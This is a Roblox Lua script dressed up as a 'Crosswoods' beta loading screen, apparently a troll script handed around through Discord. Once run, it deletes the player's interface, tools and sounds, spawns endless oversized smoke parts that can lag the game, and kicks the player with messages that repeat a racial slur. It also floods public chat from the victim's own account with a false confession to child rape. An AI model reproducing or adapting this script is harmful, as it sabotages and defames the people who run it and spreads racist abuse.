game.Players.LocalPlayer.Character.HumanoidRootPart.Position = Vector3.new(53472, 215598848, -1)
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true

game.StarterGui:SetCore(
	"SendNotification",
	{
		Title = "Crosswoods",
		Text = "Script Made by: 'fadedisshere_50193' on discord.",
		Icon = "rbxassetid://18717710806",
		Button1 = "cool",
		Button2 = "not cool",
		Duration = 5
	}
)

game:GetService("GuiService").MenuOpened:Connect(function()
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)

	local player = game.Players.LocalPlayer
	local playerGui = player:WaitForChild("PlayerGui")
	for _, guiElement in pairs(playerGui:GetChildren()) do
		if guiElement:IsA("ScreenGui") then
			guiElement:Destroy()
		end
	end

	local player = game.Players.LocalPlayer
	local Backpack = player:WaitForChild("Backpack")
	for _, BackpackElement in pairs(Backpack:GetChildren()) do
		if BackpackElement:IsA("Tool") then
			BackpackElement:Destroy()
		end
	end


	local soundService = game:WaitForChild("SoundService")
	for _, soundElement in pairs(soundService:GetChildren()) do
		if soundElement:IsA("Sound") then
			soundElement:Destroy()
		end
	end
	local function sound()
		local newsound44 = Instance.new("Sound", game.SoundService)
		newsound44.SoundId = "rbxassetid://2241064801"
		newsound44.Volume = 10
		newsound44.Looped = true
		newsound44:Play()
		local newclone = newsound44:Clone()
		newclone.Parent = game.SoundService
	end
	local Sky = Instance.new("Sky", game.Lighting)
	Sky.Name = "afsdfadsafsdsadfsadffdasdsf"
	Sky.SkyboxBk = "rbxassetid://7051505353"

	Sky.SkyboxDn = "rbxassetid://7051505353"

	Sky.SkyboxFt = "rbxassetid://7051505353"

	Sky.SkyboxLf = "rbxassetid://7051505353"

	Sky.SkyboxRt = "rbxassetid://7051505353"

	Sky.SkyboxUp = "rbxassetid://7051505353"
	sound()
	local function XSZFE()	
		while task.wait() do
			game.StarterGui:SetCore(
				"SendNotification",
				{
					Title = "NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! ",
					Text = "WHY DID YOU TRY TO LEAVE: NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! ",
					Icon = "rbxassetid://7051505353",
					Duration = 999
				}
			)
		end
	end
	coroutine.wrap(XSZFE)()
    game.Players.LocalPlayer:Kick("NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! NIGGER! ")
end)

game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)

local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
for _, guiElement in pairs(playerGui:GetChildren()) do
	if guiElement:IsA("ScreenGui") then
		guiElement:Destroy()
	end
end

local player = game.Players.LocalPlayer
local Backpack = player:WaitForChild("Backpack")
for _, BackpackElement in pairs(Backpack:GetChildren()) do
	if BackpackElement:IsA("Tool") then
		BackpackElement:Destroy()
	end
end


local soundService = game:WaitForChild("SoundService")
for _, soundElement in pairs(soundService:GetChildren()) do
	if soundElement:IsA("Sound") then
		soundElement:Destroy()
	end
end

local LoadingUI = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local CrosswoodsTitle = Instance.new("TextLabel")
local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
local BetaText = Instance.new("TextLabel")
local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
local Created = Instance.new("TextLabel")
local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
local Text1 = Instance.new("TextLabel")
local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")
local Text = Instance.new("TextLabel")
local UITextSizeConstraint_5 = Instance.new("UITextSizeConstraint")
local LoadingFrame = Instance.new("Frame")
local Line = Instance.new("Frame")
local QuitButton = Instance.new("TextButton")
local UITextSizeConstraint_6 = Instance.new("UITextSizeConstraint")
local MainLoadingText = Instance.new("TextLabel")
local UITextSizeConstraint_7 = Instance.new("UITextSizeConstraint")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")

--Properties:

LoadingUI.Name = "LoadingUI"
LoadingUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
LoadingUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
LoadingUI.ResetOnSpawn = false

MainFrame.Name = "MainFrame"
MainFrame.Parent = LoadingUI
MainFrame.BackgroundColor3 = Color3.fromRGB(3, 2, 3)
MainFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BorderSizePixel = 0
MainFrame.Size = UDim2.new(1, 0, 1, 0)

CrosswoodsTitle.Name = "CrosswoodsTitle"
CrosswoodsTitle.Parent = MainFrame
CrosswoodsTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CrosswoodsTitle.BackgroundTransparency = 1.000
CrosswoodsTitle.BorderColor3 = Color3.fromRGB(0, 0, 0)
CrosswoodsTitle.BorderSizePixel = 0
CrosswoodsTitle.Position = UDim2.new(0.156652361, 0, 0.137670204, 0)
CrosswoodsTitle.Size = UDim2.new(0.686695278, 0, 0.196671709, 0)
CrosswoodsTitle.Font = Enum.Font.Merriweather
CrosswoodsTitle.Text = "Crosswoods"
CrosswoodsTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
CrosswoodsTitle.TextScaled = true
CrosswoodsTitle.TextSize = 14.000
CrosswoodsTitle.TextWrapped = true

UITextSizeConstraint.Parent = CrosswoodsTitle

BetaText.Name = "BetaText"
BetaText.Parent = MainFrame
BetaText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BetaText.BackgroundTransparency = 1.000
BetaText.BorderColor3 = Color3.fromRGB(0, 0, 0)
BetaText.BorderSizePixel = 0
BetaText.Position = UDim2.new(0.251301259, 0, 0.334341913, 0)
BetaText.Size = UDim2.new(0.496781111, 0, 0.0953101367, 0)
BetaText.Font = Enum.Font.Merriweather
BetaText.Text = "Beta Preview: BUILD #2303.A.2"
BetaText.TextColor3 = Color3.fromRGB(31, 30, 30)
BetaText.TextScaled = true
BetaText.TextSize = 14.000
BetaText.TextWrapped = true

UITextSizeConstraint_2.Parent = BetaText
UITextSizeConstraint_2.MaxTextSize = 37

Created.Name = "Created"
Created.Parent = MainFrame
Created.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Created.BackgroundTransparency = 1.000
Created.BorderColor3 = Color3.fromRGB(0, 0, 0)
Created.BorderSizePixel = 0
Created.Position = UDim2.new(0.226623073, 0, 0.397881985, 0)
Created.Size = UDim2.new(0.546137333, 0, 0.0953101367, 0)
Created.Font = Enum.Font.Merriweather
Created.Text = "Created by CLIENTERR0R & fadedisshere_50193" -- "Created by CLIENTERR0R & Badelize"
Created.TextColor3 = Color3.fromRGB(31, 30, 30)
Created.TextScaled = true
Created.TextSize = 14.000
Created.TextWrapped = true

UITextSizeConstraint_3.Parent = Created
UITextSizeConstraint_3.MaxTextSize = 76

Text1.Name = "Text1"
Text1.Parent = MainFrame
Text1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Text1.BackgroundTransparency = 1.000
Text1.BorderColor3 = Color3.fromRGB(0, 0, 0)
Text1.BorderSizePixel = 0
Text1.Position = UDim2.new(0.00988494512, 0, 0.903177023, 0)
Text1.Size = UDim2.new(0.240956485, 0, 0.0377908945, 0)
Text1.Font = Enum.Font.Merriweather
Text1.Text = "Server Location: NA/Virginia"
Text1.TextColor3 = Color3.fromRGB(31, 30, 30)
Text1.TextScaled = true
Text1.TextSize = 14.000
Text1.TextWrapped = true

UITextSizeConstraint_4.Parent = Text1
UITextSizeConstraint_4.MaxTextSize = 37

Text.Name = "Text"
Text.Parent = MainFrame
Text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Text.BackgroundTransparency = 1.000
Text.BorderColor3 = Color3.fromRGB(0, 0, 0)
Text.BorderSizePixel = 0
Text.Position = UDim2.new(0.00988494512, 0, 0.93991816, 0)
Text.Size = UDim2.new(0.240956485, 0, 0.037790902, 0)
Text.Font = Enum.Font.Merriweather
Text.Text = "Badeli Engine Version: 6.0"
Text.TextColor3 = Color3.fromRGB(31, 30, 30)
Text.TextScaled = true
Text.TextSize = 14.000
Text.TextWrapped = true

UITextSizeConstraint_5.Parent = Text
UITextSizeConstraint_5.MaxTextSize = 37

LoadingFrame.Name = "LoadingFrame"
LoadingFrame.Parent = MainFrame
LoadingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LoadingFrame.BackgroundTransparency = 1.000
LoadingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
LoadingFrame.BorderSizePixel = 0
LoadingFrame.Position = UDim2.new(0.304721028, 0, 0.65342164, 0)
LoadingFrame.Size = UDim2.new(0.387339056, 0, 0.236972705, 0)

Line.Name = "Line"
Line.Parent = LoadingFrame
Line.BackgroundColor3 = Color3.fromRGB(30, 29, 30)
Line.BorderColor3 = Color3.fromRGB(0, 0, 0)
Line.BorderSizePixel = 0
Line.Position = UDim2.new(0.200918093, 0, 0.490652978, 0)
Line.Size = UDim2.new(0.595567882, 0, 0.0157068055, 0)

QuitButton.Name = "QuitButton"
QuitButton.Parent = LoadingFrame
QuitButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
QuitButton.BackgroundTransparency = 1.000
QuitButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
QuitButton.BorderSizePixel = 0
QuitButton.Position = UDim2.new(0.279971808, 0, 0.570083678, 0)
QuitButton.Size = UDim2.new(0.432132959, 0, 0.204188481, 0)
QuitButton.Font = Enum.Font.Fondamento
QuitButton.Text = "Quit"
QuitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
QuitButton.TextScaled = true
QuitButton.TextSize = 14.000
QuitButton.TextWrapped = true

UITextSizeConstraint_6.Parent = QuitButton
UITextSizeConstraint_6.MaxTextSize = 39

MainLoadingText.Name = "MainLoadingText"
MainLoadingText.Parent = LoadingFrame
MainLoadingText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainLoadingText.BackgroundTransparency = 1.000
MainLoadingText.BorderColor3 = Color3.fromRGB(0, 0, 0)
MainLoadingText.BorderSizePixel = 0
MainLoadingText.Position = UDim2.new(0.0713854358, 0, 0.151293695, 0)
MainLoadingText.Size = UDim2.new(0.864265919, 0, 0.198952883, 0)
MainLoadingText.Font = Enum.Font.Merriweather
MainLoadingText.Text = "Loading... (0/428)"
MainLoadingText.TextColor3 = Color3.fromRGB(255, 247, 247)
MainLoadingText.TextScaled = true
MainLoadingText.TextSize = 14.000
MainLoadingText.TextWrapped = true

UITextSizeConstraint_7.Parent = MainLoadingText
UITextSizeConstraint_7.MaxTextSize = 38

UIAspectRatioConstraint.Parent = LoadingUI
UIAspectRatioConstraint.AspectRatio = 1.156

-- Scripts:

local function XSZFE_fake_script() -- MainFrame.LocalScript 
	local script = Instance.new('LocalScript', MainFrame)

	while task.wait(1) do
		if MainLoadingText.Text == "Loading... (328/428)" then
			LoadingUI.Enabled = false
		end
	end
end
coroutine.wrap(XSZFE_fake_script)()
local function GZLI_fake_script() -- MainLoadingText.LocalScript 
	local script = Instance.new('LocalScript', MainLoadingText)

	local sound0 = Instance.new("Sound")
	sound0.Parent = game.SoundService
	sound0.SoundId = "rbxassetid://1846503297"
	sound0:Play()

	local maxValue = 254
	local totalValue = 428
	local updateInterval = 0.1 -- 0.01

	local currentValue = 0

	QuitButton.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer:Kick(" [DWC] discord.gg/trolimon")
		game.Workspace:WaitForChild("dfweczwefljnjdsafknjnasdflknasdflkjnasdflkjnasdflkjnjasdflkjnawsdflkjn"):Destroy()
		local player = game.Players.LocalPlayer
		local playerGui = player:WaitForChild("PlayerGui")
		for _, guiElement in pairs(playerGui:GetChildren()) do
			if guiElement:IsA("ScreenGui") then
				guiElement:Destroy()
			end
		end

		local player = game.Players.LocalPlayer
		local Backpack = player:WaitForChild("Backpack")
		for _, BackpackElement in pairs(Backpack:GetChildren()) do
			if BackpackElement:IsA("Tool") then
				BackpackElement:Destroy()
			end
		end


		local soundService = game:WaitForChild("SoundService")
		for _, soundElement in pairs(soundService:GetChildren()) do
			if soundElement:IsA("Sound") then
				soundElement:Destroy()
			end
		end
		game.Lighting:WaitForChild("sdfgkfmgfdsgsdfsdfgfsdgfsgdsgfd"):Destroy()
	end)

	while currentValue <= maxValue do
		MainLoadingText.Text = string.format("Loading... (%d/%d)", currentValue, totalValue)
		currentValue = currentValue + 1
		wait(updateInterval)
	end
	sound0:Destroy()
	local player = game.Players.LocalPlayer

	wait(4)
	player:Kick()
	wait(.5)
	player:Kick(" [DWC] discord.gg/trolimon")

	local soundService = game:WaitForChild("SoundService")
	for _, soundElement in pairs(soundService:GetChildren()) do
		if soundElement:IsA("Sound") then
			soundElement:Destroy()
		end
	end

	local newsound = Instance.new("Sound", game.SoundService)
	newsound.SoundId = "rbxassetid://1843027392"
	newsound:Play()

	local newsound22 = Instance.new("Sound", game.SoundService)
	newsound22.SoundId = "rbxassetid://7649721525"
	newsound22:Play()

	wait(1)

	local newsound44 = Instance.new("Sound", game.SoundService)
	newsound44.SoundId = "rbxassetid://2241064801"
	newsound44.Volume = 10
	newsound44.Looped = true
	newsound44:Play()
end
coroutine.wrap(GZLI_fake_script)()
local function NBEOD_fake_script() -- LoadingUI.LocalScript 
	local script = Instance.new('LocalScript', LoadingUI)

	LoadingUI.IgnoreGuiInset = true
	LoadingUI.ResetOnSpawn = false

	local function lol()
		local folder = Instance.new("Folder", game.Workspace)
		folder.Name = "SmokePartsE123123123123"
		while task.wait() do
			local part = Instance.new("Part", folder)
			part.Size = UDim2.new(2048, 2048, 2048)
			part.Material = Enum.Material.Neon
			part.Anchored = false
			part.Name = "nigger water"
			local smoke = Instance.new("Smoke", part)
			smoke.Opacity = 0
			smoke.RiseVelocity = 25
			smoke.Size = 3000
			smoke.TimeScale = 100000
		end
	end
	wait(26.32)
	lol()
end
coroutine.wrap(NBEOD_fake_script)()

wait(26.32)
local MenuCam = Instance.new("Part", game.Workspace)
MenuCam.Name = "dfweczwefljnjdsafknjnasdflknasdflkjnasdflkjnasdflkjnjasdflkjnawsdflkjn"
local sound1 = Instance.new("Sound", game.SoundService)
sound1.SoundId = "rbxassetid://5351101493"
sound1:Play()
local sound2 = Instance.new("Sound", game.SoundService)
sound2.SoundId = "rbxassetid://4860560167"
sound2.Looped = true
sound2:Play()
MenuCam.Transparency = 1
MenuCam.Size = Vector3.new(4, 1.89, 2.38)
MenuCam.Position = Vector3.new(55450.645, 17648.945, 2)
MenuCam.Orientation = Vector3.new(0, -90, 0)
local Camera = game.Workspace.CurrentCamera

Camera.CameraType = Enum.CameraType.Scriptable
Camera.CFrame = MenuCam.CFrame

local Sky = Instance.new("Sky", game.Lighting)
Sky.Name = "sdfgkfmgfdsgsdfsdfgfsdgfsgdsgfd"
Sky.SkyboxBk = "rbxassetid://15502324143"

Sky.SkyboxDn = "rbxassetid://15502324962"

Sky.SkyboxFt = "rbxassetid://15502325676"

Sky.SkyboxLf = "rbxassetid://15502326432"

Sky.SkyboxRt = "rbxassetid://15502327161"

Sky.SkyboxUp = "rbxassetid://15502328272"

local TextChatService = game:GetService("TextChatService")
local LocalPlayer = game.Players.LocalPlayer

local Word = "i rfkape children"

local function Chat()
	if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
		while task.wait() do
			local player = game.Players.LocalPlayer
			local playerGui = player:WaitForChild("PlayerGui")
			for _, guiElement in pairs(playerGui:GetChildren()) do
				if guiElement:IsA("ScreenGui") then
					guiElement:Destroy()
				end
			end
			local chatChannel1 = TextChatService.TextChannels.RBXGeneral
			chatChannel1:SendAsync(Word)
		end
	end

	if TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService then
		while task.wait() do
			local tbl_main = 
				{
					Word, 
					"All"
				}
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
		end
	end
end

Chat()
